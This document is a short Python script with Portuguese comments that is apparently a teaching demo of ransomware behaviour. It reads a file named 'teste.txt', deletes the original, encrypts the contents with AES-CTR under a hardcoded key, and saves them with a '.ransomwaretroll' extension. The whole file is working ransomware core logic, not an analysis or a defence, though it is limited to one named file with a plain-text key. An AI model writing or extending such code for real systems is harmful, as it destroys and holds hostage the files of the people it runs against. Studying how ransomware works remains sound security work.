import os  # Biblioteca para interagir com o sistema operacional, como manipular arquivos
import pyaes  # Biblioteca para operações de criptografia AES

# Abrir o arquivo que será criptografado
# O arquivo "teste.txt" é aberto no modo de leitura binária ("rb")
file_name = "teste.txt"
file = open(file_name, "rb")
file_data = file.read()  # Ler todo o conteúdo do arquivo
file.close()  # Fechar o arquivo para liberar o recurso do sistema

# Remover o arquivo original do sistema após a leitura
# Isso simula o comportamento de alguns ransomwares
os.remove(file_name)

# Definir a chave de criptografia
# A chave precisa ter 16, 24 ou 32 bytes para o AES
key = b"testeransomwares"

# Inicializar o modo de operação AES-CTR com a chave definida
aes = pyaes.AESModeOfOperationCTR(key)

# Criptografar o conteúdo lido do arquivo usando a chave definida
crypto_data = aes.encrypt(file_data)

# Criar um novo arquivo para salvar os dados criptografados
# O arquivo terá a extensão adicional ".ransomwaretroll"
new_file = file_name + ".ransomwaretroll"
new_file = open(f'{new_file}', 'wb')  # Abrir o novo arquivo no modo de escrita binária ("wb")
new_file.write(crypto_data)  # Escrever os dados criptografados no arquivo
new_file.close()  # Fechar o arquivo para concluir a operação